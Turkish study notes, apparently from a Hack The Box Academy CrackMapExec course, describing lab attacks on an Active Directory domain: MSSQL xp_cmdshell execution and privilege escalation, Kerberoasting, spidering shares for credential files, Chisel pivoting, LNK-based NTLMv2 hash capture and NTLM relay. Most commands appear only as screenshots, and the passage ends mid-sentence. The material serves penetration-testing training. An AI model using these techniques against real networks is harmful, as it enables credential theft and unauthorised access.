LDAP modülü user-desc, Active Directory domainindeki tüm kullanıcıları sorgular ve açıklamalarını alır, yalnızca varsayılan anahtar kelimelerle eşleşen kullanıcı açıklamalarını görüntüler, ancak tüm açıklamaları bir dosyaya kaydeder.

Varsayılan anahtar kelimeler açıklamada belirtilmemiştir. Bu anahtar kelimelerin ne olduğunu bilmek istiyorsak, kaynak koduna bakmamız gerekir. Kaynak kodunu CrackMapExec/cme/modules/ dizininde bulabiliriz. Daha sonra modül adını arayabilir ve açabiliriz. Bizim durumumuzda, user-desc modülünü içeren Python betiği user_description.py'dir. Anahtar kelimeleri bulmak için dosyayı grepleyelim :


### user-desc Modülünün Kaynak Koduna Bakmak
![Pasted image 20241202020312.png](/img/user/resimler/Pasted%20image%2020241202020312.png)

Modülü kullanalım ve ilginç kullanıcı açıklamalarını bulalım:

### user-desc Modülünü Kullanarak Kullanıcı Açıklamasını Alma
![Pasted image 20241202020351.png](/img/user/resimler/Pasted%20image%2020241202020351.png)

Gördüğümüz gibi, key ve pass anahtar kelimelerini içeren açıklamayı görüntüler, ancak tüm açıklamalar günlük dosyasına kaydedilir


### Dosyayı Tüm Açıklamalarla Açma
![Pasted image 20241202020456.png](/img/user/resimler/Pasted%20image%2020241202020456.png)
![Pasted image 20241202020500.png](/img/user/resimler/Pasted%20image%2020241202020500.png)


### Seçenekli Modül Kullanımı
Eğer bir modül seçeneği kullanmak istiyorsak -o bayrağını kullanmamız gerekir. Tüm seçenekler KEY=value şeklinde belirtilir (msfvenom stili). Aşağıdaki örnekte, varsayılan anahtar kelimeleri ve ekran değerlerini pwd ve admin anahtar kelimeleriyle değiştireceğiz.

### user-desc'i Yeni Anahtar Kelimelerle Kullanma
![Pasted image 20241202020554.png](/img/user/resimler/Pasted%20image%2020241202020554.png)


### Kullanıcı Üyeliğini Sorgulama
groupmembership, bu eğitim sırasında bir HTB Akademi eğitim geliştiricisi tarafından oluşturulan ve bir kullanıcının ait olduğu grupları sorgulamamızı sağlayan bir başka modül örneğidir (kendi modüllerinizi nasıl oluşturacağınızı daha sonra tartışacağız). Kullanmak için USER seçeneği ile sorgulamak istediğimiz kullanıcıyı belirtmemiz gerekiyor.

Bu eğitimin yazıldığı sırada bu modül için bir [PR](https://github.com/byt3bl33d3r/CrackMapExec/pull/696) var, ancak indirilir ve onaylanana kadar modüller klasörüne yerleştirilirse kullanılabilir.


### Özel Modül ile Grup Üyeliğini Sorgulama
![Pasted image 20241202020915.png](/img/user/resimler/Pasted%20image%2020241202020915.png)
![Pasted image 20241202020933.png](/img/user/resimler/Pasted%20image%2020241202020933.png)


### MSSQL Enumeration and Attacks
Bir MSSQL sunucusu bulmak çok ilginçtir çünkü veritabanları genellikle saldırı operasyonlarımızı ilerletmek ve daha fazla erişim elde etmek için kullanabileceğimiz bilgiler içerir. Değerlendirmemizin amacı olan hassas verilere de erişim elde edebiliriz. Ayrıca, [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) özelliğini kullanarak bir MSSQL veritabanı üzerinden işletim sistemi komutlarını çalıştırabiliriz.

Parola Püskürtme bölümünde tartıştığımız gibi, SQL'e üç farklı türde kullanıcı hesabı ile kimlik doğrulaması yapabiliriz. Veritabanı üzerinde hangi yetkilere sahip olduğumuzu ve hangi veritabanına erişimimiz olduğunu göz önünde bulundurmak ve veritabanı dba (veritabanı yöneticisi) kullanıcısı olup olmadığımızı doğrulamak da önemlidir.

Veritabanlarıyla çalışırken genellikle iki işlem gerçekleştiririz:
* SQL Sorgularını Yürütme
* Windows Komutlarını Yürütme

### SQL Sorgularını Yürütme
SQL sorgusu veritabanı ile etkileşim kurmamızı sağlar. Bilgi alabilir veya veritabanı tablolarına veri ekleyebiliriz. Ayrıca veritabanının yönetim ve idaresinin farklı operasyonel işlevlerini de kullanabiliriz. Bir hesap aldıktan sonra, -q seçeneğini kullanarak bir SQL sorgusu gerçekleştirebiliriz.


### Tüm Veritabanı Adlarını Almak için SQL Sorgusu
![Pasted image 20241202024204.png](/img/user/resimler/Pasted%20image%2020241202024204.png)
Bir MSSQL kullanıcısı belirtmek için --local-auth seçeneğini de kullanabiliriz. Bu seçeneği seçmezsek, bunun yerine bir domain hesabı kullanılacaktır.


### SQL Queries
![Pasted image 20241202024348.png](/img/user/resimler/Pasted%20image%2020241202024348.png)
![Pasted image 20241202024355.png](/img/user/resimler/Pasted%20image%2020241202024355.png)


![Pasted image 20241202025406.png](/img/user/resimler/Pasted%20image%2020241202025406.png)


![Pasted image 20241202025541.png](/img/user/resimler/Pasted%20image%2020241202025541.png)
![Pasted image 20241202025547.png](/img/user/resimler/Pasted%20image%2020241202025547.png)

Veritabanlarını, tabloları ve içeriği listelemek için bazı veritabanı sorguları gerçekleştirdik. SQL sorguları kullanarak veritabanlarının nasıl numaralandırılacağı hakkında daha fazla bilgi edinmek için Attacking Common Services modülünden Attacking SQL Databases bölümünü okuyabiliriz


### Windows Komutlarını Yürütme

Bir hesap bulduğumuzda, CrackMapExec otomatik olarak kullanıcının bir DBA (Veritabanı Yöneticisi) hesabı olup olmadığını kontrol edecektir. Çıktıyı fark edersek Pwn3d! , kullanıcı bir Veritabanı Yöneticisidir. DBA ayrıcalıklarına sahip kullanıcılar bir veritabanı nesnesine erişebilir, değiştirebilir veya silebilir ve diğer kullanıcılara haklar verebilir. Bu kullanıcı veritabanına karşı herhangi bir eylem gerçekleştirebilir.


### DBA Hesabı ile Kimlik Doğrulama
![Pasted image 20241202030356.png](/img/user/resimler/Pasted%20image%2020241202030356.png)

MSSQL, SQL kullanarak sistem komutlarını yürütmemizi sağlayan xp_cmdshell adlı bir extended stored procedure'e sahiptir. Bir DBA hesabı, Windows işletim sistemi komutlarını yürütmek için gereken özellikleri etkinleştirme ayrıcalıklarına sahiptir.

Bir Windows komutunu çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir:


### Executing Windows Commands
![Pasted image 20241202031816.png](/img/user/resimler/Pasted%20image%2020241202031816.png)
![Pasted image 20241202031823.png](/img/user/resimler/Pasted%20image%2020241202031823.png)
Not: MSSQL aracılığıyla Windows komutlarını çalıştırabilmek, Windows makinesinde local administrator olduğumuz anlamına gelmez. Ayrıcalıklarımızı yükseltebilir veya hedef makine hakkında daha fazla bilgi almak için bu erişimi kullanabiliriz.


### MSSQL ile Dosya Aktarma
MSSQL, sırasıyla OPENROWSET (Transact-SQL) ve Ole Automation Procedures Sunucu Yapılandırma Seçeneklerini kullanarak dosyaları indirmemize ve yüklememize izin verir. CrackMapExec bu seçenekleri --put-file ve --get-file ile birleştirir.

Hedef makinemize bir dosya yüklemek için --put-file seçeneğini ve ardından yüklemek istediğimiz yerel dosyayı ve hedef dizini kullanabiliriz


### Upload File

![Pasted image 20241202033530.png](/img/user/resimler/Pasted%20image%2020241202033530.png)

![Pasted image 20241202035910.png](/img/user/resimler/Pasted%20image%2020241202035910.png)
![Pasted image 20241202035921.png](/img/user/resimler/Pasted%20image%2020241202035921.png)

Bir dosyayı indirmek için, --get-file seçeneğini kullanmamız ve ardından dosyanın yolunu ve bir çıktı dosyası adı belirlememiz gerekir.


### MSSQL aracılığıyla Hedef Makineden Dosya İndirme
![Pasted image 20241202040010.png](/img/user/resimler/Pasted%20image%2020241202040010.png)
![Pasted image 20241202040015.png](/img/user/resimler/Pasted%20image%2020241202040015.png)



### SQL Privilege Escalation **Module**
CrackMapExec, MSSQL için birkaç modül içerir; bunlardan biri, standart bir kullanıcıdan sistem yöneticisine yükselmeye çalışmak için MSSQL ayrıcalıklarını numaralandıran ve kullanan mssql_priv'dir. Bunu başarmak için, bu modül MSSQL EXECUTE AS LOGIN ve db_owner rolündeki iki (2) farklı ayrıcalık yükseltme vektörünü numaralandırır. Modülün ayrıcalıkları listelemek için enum_privs (varsayılan), ayrıcalıkları yükseltmek için privesc ve kullanıcıyı orijinal durumuna döndürmek için rollback olmak üzere üç seçeneği vardır. Şimdi bunu iş başında görelim. Aşağıdaki örnekte, INLANEFREIGHT\robert kullanıcısı bir sysadmin kullanıcısı olan julio'yu taklit etme ayrıcalığına sahiptir


### MSSQL Privilege Escalation
![Pasted image 20241202131137.png](/img/user/resimler/Pasted%20image%2020241202131137.png)

![Pasted image 20241202131142.png](/img/user/resimler/Pasted%20image%2020241202131142.png)

![Pasted image 20241202131222.png](/img/user/resimler/Pasted%20image%2020241202131222.png)

Bir sysadmin kullanıcısı olarak artık komutları çalıştırabiliriz. Bunu yapalım ve ardından ayrıcalıklarımızı orijinal durumlarına geri döndürelim


### Komutları Yürütme ve Ayrıcalıkları Geri Alma
![Pasted image 20241202131257.png](/img/user/resimler/Pasted%20image%2020241202131257.png)

![Pasted image 20241202131304.png](/img/user/resimler/Pasted%20image%2020241202131304.png)

![Pasted image 20241202131312.png](/img/user/resimler/Pasted%20image%2020241202131312.png)
![Pasted image 20241202131317.png](/img/user/resimler/Pasted%20image%2020241202131317.png)

Not: Modülü sahip olduğumuz kullanıcılarla test etmek için, --no-bruteforce ve --continue-on-success ile çoklu kullanıcı işlevselliği bir modülü aynı anda birden fazla hesapla test etmeyi desteklemediğinden, bunları tek tek denemek gerekir.


### Finding Kerberoastable Accounts
Kerberoasting saldırısı, tipik olarak bir hizmet hesabı olan servicePrincipalName (SPN) değerlerine sahip bir kullanıcıdan TGS (Ticket Granting Service) Biletleri toplamayı amaçlar. Herhangi bir geçerli Active Directory hesabı, herhangi bir SPN hesabı için bir TGS talep edebilir. Biletin bir kısmı hesabın NTLM parola hash'i ile şifrelenir, bu da parolayı çevrimdışı olarak kırmayı denememize olanak tanır. Bu saldırının nasıl çalıştığı hakkında daha fazla bilgi edinmek için Active Directory Numaralandırma ve Saldırılar modülünün Kerberoasting bölümüne göz atın.

Kerberoastable hesaplarını bulmak için, domain'de geçerli bir kullanıcıya sahip olmamız, --kerberoasting seçeneği ve ardından bir dosya adı ile LDAP protokolünü kullanmamız ve DC'nin IP adresini CrackMapExec'te hedef olarak belirtmemiz gerekir:


### Kerberoasting Attack
![Pasted image 20241202132926.png](/img/user/resimler/Pasted%20image%2020241202132926.png)
![Pasted image 20241202133020.png](/img/user/resimler/Pasted%20image%2020241202133020.png)
![Pasted image 20241202133108.png](/img/user/resimler/Pasted%20image%2020241202133108.png)
![Pasted image 20241202133123.png](/img/user/resimler/Pasted%20image%2020241202133123.png)

Herhangi bir Kerberoastable hesabı varsa, CrackMapExec bunları çevrimdışı olarak kırmayı denememiz gereken hash ile birlikte görüntüler. Bizim durumumuzda, şifreyi kırmak için rockyou.txt kelime listesini ve Hashcat uygulamasını kullanacağız. Hashcat kullanımı hakkında daha fazla bilgi için Hashcat ile Şifre Kırma modülüne bakın.


### Cracking the Hash
![Pasted image 20241202133720.png](/img/user/resimler/Pasted%20image%2020241202133720.png)
![Pasted image 20241202133733.png](/img/user/resimler/Pasted%20image%2020241202133733.png)

Hesabın parolasını aldıktan sonra, hesabın hala etkin olup olmadığını doğrulamamız gerekir. Bunu SMB protokolünü kullanarak yapabiliriz, çünkü normal bir domain kullanıcısı veya yönetici hesabı olarak kimlik doğrulaması yapmaya çalışacaktır.


### Testing the Account Credentials
![Pasted image 20241202133809.png](/img/user/resimler/Pasted%20image%2020241202133809.png)
![Pasted image 20241202133813.png](/img/user/resimler/Pasted%20image%2020241202133813.png)


### Bir SMB Paylaşımında Spidering ve Önemli Bilgileri Bulma
Şirketlerin, insanlar ve departmanlar arasında işbirliğini sağlamak için bilgileri merkezi bir konumda depolaması gerekir. Genellikle bir departman, başka bir departmanın işlemesi gereken bilgileri işler. Şirketlerin bu tür bir işbirliğine izin vermesinin en yaygın yollarından biri paylaşılan klasörlerdir.

Erişim sağladığımız hesapları kullanarak paylaşım klasörlerine erişim talep etmek ve erişimleri olup olmadığını tespit etmek için --shares seçeneğini kullanabiliriz.


### Hesapların Paylaşılan Klasörlere Erişimi Olup Olmadığını Belirleme
![Pasted image 20241202134039.png](/img/user/resimler/Pasted%20image%2020241202134039.png)
![Pasted image 20241202134047.png](/img/user/resimler/Pasted%20image%2020241202134047.png)

Not: Bu modül yazılırken, CrackMapExec --shares seçeneği ile birden fazla kullanıcı adı ve parola sorgulamayı desteklemiyordu

--shares seçeneği, hedef makinedeki her bir paylaşımı ve kullanıcımızın bu paylaşımlar üzerinde hangi izinlere (READ/WRITE) sahip olduğunu gösterir. IT adlı ilginç bir klasöre okuma ve yazma erişimimiz var. Impacket smbclient kullanarak kolayca açabilir veya paylaşımı bağlayabiliriz. Yüzlerce paylaşımın içeriğini kontrol ederken elverişsiz hale gelebilir. Bu amaçla, CrackMapExec, örümcek seçeneği ve spider_plus modülü olmak üzere iki harika özellikle birlikte gelir.

Not: Domain'deki herhangi bir bilgisayarın bir paylaşımlı klasöre sahip olabileceğini unutmayın. Paylaşılan klasörleri bulmak için hedeflediğimiz ağda önceden tanımlanmış makineleri hedeflemeliyiz.


### The Spider Option

CrackMapExec'teki --spider seçeneği, remote bir paylaşım içinde arama yapmanıza ve aradığınız şeye bağlı olarak ilginç dosyalar bulmanıza olanak tanır. Örneğin, -- pattern seçeneğini ve ardından aramak istediğimiz kelimeyi ekliyoruz, bu durumda txt ve üzerinde txt olan tüm dosyaları listeleyebiliriz (test.txt, atxtb.csv)

### “txt” İçeren Dosyaları Aramak için Örümcek Seçeneğini Kullanma
![Pasted image 20241202135649.png](/img/user/resimler/Pasted%20image%2020241202135649.png)
![Pasted image 20241202135656.png](/img/user/resimler/Pasted%20image%2020241202135656.png)

Klasörler, dosya adları veya dosya içeriği üzerinde daha ayrıntılı aramalar yapmak için --regex [REGEX] seçeneğiyle düzenli ifadeleri de kullanabiliriz. Aşağıdaki örnekte, paylaşılan IT klasöründeki herhangi bir dosya ve dizini görüntülemek için --regex . kullanalım:


### BT Paylaşımındaki Tüm Dosya ve Dizinleri Listele seçeneğini de kullanabiliriz
![Pasted image 20241202140010.png](/img/user/resimler/Pasted%20image%2020241202140010.png)
![Pasted image 20241202140017.png](/img/user/resimler/Pasted%20image%2020241202140017.png)


Dosya içeriğinde arama yapmak istiyorsak --content seçeneği ile bunu etkinleştirmemiz gerekir. “Encrypt” kelimesini içeren bir dosya arayalım.


### Dosya İçeriğini Arama
![Pasted image 20241202140711.png](/img/user/resimler/Pasted%20image%2020241202140711.png)

Çok ilginç bilgiler içeren Creds.txt adlı ilginç bir dosya görebiliriz. CrackMapExec kullanarak uzaktaki bir dosyayı alabiliriz. Paylaşımı ==--share SHARENAME== seçeneğini kullanarak belirtmemiz, ardından --get-file kullanmamız ve ardından dosyanın paylaşım içindeki yolunu kullanmamız ve bir çıktı dosyası adı belirlememiz gerekir.


### Paylaşılan Klasördeki Bir Dosyayı Alma
![Pasted image 20241202140758.png](/img/user/resimler/Pasted%20image%2020241202140758.png)
![Pasted image 20241202140803.png](/img/user/resimler/Pasted%20image%2020241202140803.png)

![Pasted image 20241202140809.png](/img/user/resimler/Pasted%20image%2020241202140809.png)


Tersi durumda, uzaktaki bir paylaşıma bir dosya göndermek istediğimizi düşünün. WRITE ayrıcalıklarına sahip olduğumuz bir paylaşım bulmamız gerekir. Daha sonra --get-file ile yaptığımız gibi --put-file seçeneğini kullanabiliriz.

### Paylaşılan Klasöre Dosya Gönderme
![Pasted image 20241202140902.png](/img/user/resimler/Pasted%20image%2020241202140902.png)

Not: Büyük bir dosya aktarıyorsak ve başarısız olursa, tekrar denediğinizden emin olun. Hata almaya devam ederseniz, --smb-timeout seçeneğini varsayılan iki (2) değerinden daha büyük bir değerle eklemeyi deneyin.


### The spider_plus Module

Bazen bir paylaşımla karşılaşabiliriz ve uzantıyla ilgili tüm dosyaları, onu monte etmeden veya smbclient.py kullanmadan hızlı bir şekilde listelemek isteyebiliriz. CrackMapExec, bunu halledecek spider_plus adlı bir modülle birlikte gelir. Varsayılan olarak bir /tmp/cme_spider_plus klasörü ve paylaşım ve dosya bilgilerini içeren bir JSON dosyası IP.json oluşturacaktır. Aracın IPC$ , NETLOGON , SYSVOL gibi paylaşımlara bakmasını önlemek için EXCLUDE_DIR modül seçeneğini kullanabiliriz.


### Using the Module spider_plus
![Pasted image 20241202141200.png](/img/user/resimler/Pasted%20image%2020241202141200.png)
Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme
![Pasted image 20241202141228.png](/img/user/resimler/Pasted%20image%2020241202141228.png)
![Pasted image 20241202141237.png](/img/user/resimler/Pasted%20image%2020241202141237.png)


Eğer paylaşımın tüm içeriğini indirmek istiyorsak READ_ONLY=false seçeneğini aşağıdaki gibi kullanabiliriz:
![Pasted image 20241202141532.png](/img/user/resimler/Pasted%20image%2020241202141532.png)

![Pasted image 20241202141543.png](/img/user/resimler/Pasted%20image%2020241202141543.png)

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

spider_plus modülü için mevcut tüm seçenekleri görüntülemek için --options seçeneğini kullanabiliriz:


### Spider_plus Options
![Pasted image 20241202141637.png](/img/user/resimler/Pasted%20image%2020241202141637.png)

Bir sonraki bölümde CrackMapExec'in bir proxy aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


### Proxychains with CME

Pivoting, Tunneling ve Port Forwarding modülünde, doğrudan erişimimiz olmayan ağlara bağlanmak için Chisel & Proxychains gibi araçları nasıl kullanacağımızı tartıştık. Bu bölümde, tehlikeye atılmış bir host üzerinden diğer ağlara nasıl saldırabileceğimizi anlamak için konsepti tekrar gözden geçireceğiz.


### Scenario
Dahili bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit ettik ve tehlikeye attık. Ele geçirilen bu host üzerinde ipconfig çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu 172.16.1.10 IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir tünel kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel
Tünelimizi kurmak için Chisel kullanacağız. Release'e gidelim ve tehlikeye atılmış makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

7. Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:


### Chisel - Reverse Tunnel
![Pasted image 20241202142208.png](/img/user/resimler/Pasted%20image%2020241202142208.png)

8. Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel
![Pasted image 20241202142243.png](/img/user/resimler/Pasted%20image%2020241202142243.png)
![Pasted image 20241202142251.png](/img/user/resimler/Pasted%20image%2020241202142251.png)

9. CrackMapExec komut yürütme seçeneği -x'i kullanarak Chisel sunucumuza bağlanmak için chisel.exe dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Chisel Sunucusuna Bağlanın
![Pasted image 20241202142344.png](/img/user/resimler/Pasted%20image%2020241202142344.png)
Bu terminaldeki komut, hedef makinedeki Chisel işlemini durdurduğumuzda bitecektir. Bunu bu bölümün ilerleyen kısımlarında yapacağız.

Saldırı hostumuzda, Chisel sunucusunda bir istemciden bağlantı aldığımızı ve tünelimizi başlattığımızı gösteren yeni bir satır görmeliyiz.


### Chisel Receiving Session No. 1
![Pasted image 20241202142609.png](/img/user/resimler/Pasted%20image%2020241202142609.png)

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port
![Pasted image 20241202142654.png](/img/user/resimler/Pasted%20image%2020241202142654.png)

10. Proxyychains'i Chisel varsayılan portu TCP 1080'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne socks5 127.0.0.1 1080'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains
![Pasted image 20241202142722.png](/img/user/resimler/Pasted%20image%2020241202142722.png)

11. Artık 172.16.1.10 IP'sine ulaşmak için Proxychains aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi
![Pasted image 20241202142758.png](/img/user/resimler/Pasted%20image%2020241202142758.png)
![Pasted image 20241202142811.png](/img/user/resimler/Pasted%20image%2020241202142811.png)

Proxychains çıktısını konsoldan kaldırmak için Proxychains4 ve quiet -q seçeneğini kullanabiliriz:


### Quiet Seçeneği ile Proxychains4

![Pasted image 20241202142908.png](/img/user/resimler/Pasted%20image%2020241202142908.png)
![Pasted image 20241202142939.png](/img/user/resimler/Pasted%20image%2020241202142939.png)

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine
İşimiz bittiğinde, Chisel sürecini öldürmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için -X seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız Stop-Process - Name chisel -Force . Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client
![Pasted image 20241202143058.png](/img/user/resimler/Pasted%20image%2020241202143058.png)
![Pasted image 20241202143104.png](/img/user/resimler/Pasted%20image%2020241202143104.png)

Bunu yaptıktan sonra, Chisel istemci komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'ı Durmaya Zorladıktan Sonra Terminal Sonu
![Pasted image 20241202143340.png](/img/user/resimler/Pasted%20image%2020241202143340.png)

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Closing Chisel on Our Attack Host
![Pasted image 20241202143427.png](/img/user/resimler/Pasted%20image%2020241202143427.png)


### Sunucu olarak Windows ve Client olarak Linux
Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu istemci olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için server --socks5 seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
![Pasted image 20241202143533.png](/img/user/resimler/Pasted%20image%2020241202143533.png)

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra socks seçeneğini kullanmamız gerekiyor.


### Saldırı Hostumuzdan Chisel Sunucusuna Bağlanma
![Pasted image 20241202143602.png](/img/user/resimler/Pasted%20image%2020241202143602.png)

Şimdi Proxychains'i tekrar kullanabiliriz:


### Internal Network'e Bağlanmak için Proxy Zincirlerini Kullanma
![Pasted image 20241202143710.png](/img/user/resimler/Pasted%20image%2020241202143710.png)

İlerleyen bölümlerde, diğer ağlara ulaşmak için CrackMapExec ve Proxychains kullanacağız.


### Hash'leri Çalmak
Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola karmalarının çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu karma, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için Kırmızı Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü
Slinky, @byt3bl33d3r tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge özniteliğine sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge özniteliği sunucumuza giden bir UNC yolu içerdiği için Responder kullanarak NTLMv2 hash'ini alacağız.

Modülün SERVER ve NAME olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı CLEANUP seçeneği vardır.


### Slinky Module Options
![Pasted image 20241202171602.png](/img/user/resimler/Pasted%20image%2020241202171602.png)
SERVER, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. NAME seçeneği kısayol dosyasına bir isim atar, CLEANUP ise işimiz bittiğinde kısayolu silmek içindir.


### Connecting using Chisel
Bu alıştırma için lokal erişimi simüle edeceğiz ve dahili ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra dahili ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma
![Pasted image 20241202171723.png](/img/user/resimler/Pasted%20image%2020241202171723.png)


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, -- shares seçeneğini kullanarak grace kullanıcısının WRITE ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
![Pasted image 20241202171807.png](/img/user/resimler/Pasted%20image%2020241202171807.png)
![Pasted image 20241202171817.png](/img/user/resimler/Pasted%20image%2020241202171817.png)

Gördüğümüz gibi, grace HR ve IT-Tools paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir LNK dosyası yazmak için Slinky modülünü kullanabiliriz. SERVER=10.10.14.33 seçeneğini, saldırı hostumuzun tun0 ağına karşılık gelen IP adresini ve LNK dosyasına atadığımız dosya adı olan NAME=important seçeneğini kullanacağız.


### Using Slinky
![Pasted image 20241202171914.png](/img/user/resimler/Pasted%20image%2020241202171914.png)
![Pasted image 20241202171923.png](/img/user/resimler/Pasted%20image%2020241202171923.png)
![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

Not: CrackMapExec genellikle opsec güvenli olarak kabul edilir çünkü her şey ya bellekte çalıştırılır, WinAPI çağrıları kullanılarak ağ üzerinden numaralandırılır ya da yerleşik Windows araçları/özellikleri kullanılarak yürütülür. Bir modül bu gereksinimleri karşılamadığında bir uyarı alacağız. Slinky modülü opsec güvenli olmayan modüllere bir örnektir. Devam etmeden önce bir uyarı alacağız.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. Responder'ın nasıl kullanılacağı hakkında daha fazla bilgi edinmek için Attacking Common Services modülündeki Attacking SMB bölümüne göz atabiliriz.


### Starting Responder
![Pasted image 20241202172026.png](/img/user/resimler/Pasted%20image%2020241202172026.png)
![Pasted image 20241202172032.png](/img/user/resimler/Pasted%20image%2020241202172032.png)

Not: Hash'i yakalamak için Responder.conf dosyasında SMB seçeneği Açık olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir NTLM Relay yapabiliriz. Bunu kırmak için, ASREPRoast ve Kerberoasting ile yaptığımız gibi Hashcat mod 5600'ü kullanabiliriz. NTLM Relay'e odaklanalım.


### **NTLM Relay**
Diğer bir çözüm ise NTLMv2 özetini doğrudan SMB İmzalamanın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB İmzalama çok önemlidir çünkü bir bilgisayarda SMB İmzalama etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara aktarım yapamayız. SMB İmzalama'nın devre dışı bırakıldığı hedeflerin bir listesini almak için --gen-relay-list seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB İmzalama devre dışı bırakılmış makinelerin bir listesini alabiliriz


### Getting Relay List

![Pasted image 20241202172448.png](/img/user/resimler/Pasted%20image%2020241202172448.png)
![Pasted image 20241202172452.png](/img/user/resimler/Pasted%20image%2020241202172452.png)

ntlmrelayx'i --gen-relay-list seçeneğinden elde ettiğimiz önceki liste ile kullanacağız. Hedef makinede yerel yönetici ayrıcalıklarına sahip bir hesap bulursak, başka bir seçenek belirtilmemişse, ntlmrelayx otomatik olarak hedef makinenin SAM veritabanını dökecek ve herhangi bir lokal yönetici kullanıcı hash'iyle bir pass-the-hash saldırısı gerçekleştirmeyi deneyebileceğiz



### Execute NTLMRelayX
![Pasted image 20241202172848.png](/img/user/resimler/Pasted%20image%2020241202172848.png)

Bir kullanıcı SMB paylaşımına erişene ve LNK dosyamız onu hedef makinemize bağlanmaya zorlayana kadar beklememiz gerekir (bu arka planda gerçekleşir ve kullanıcı olağan dışı bir şey fark etmeyecektir). Bu yapıldıktan sonra, ntlmrelayx konsolunda buna benzer bir şey görmeliyiz:

![Pasted image 20241202172943.png](/img/user/resimler/Pasted%20image%2020241202172943.png)
![Pasted image 20241202172950.png](/img/user/resimler/Pasted%20image%2020241202172950.png)

Ardından, yönetici hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

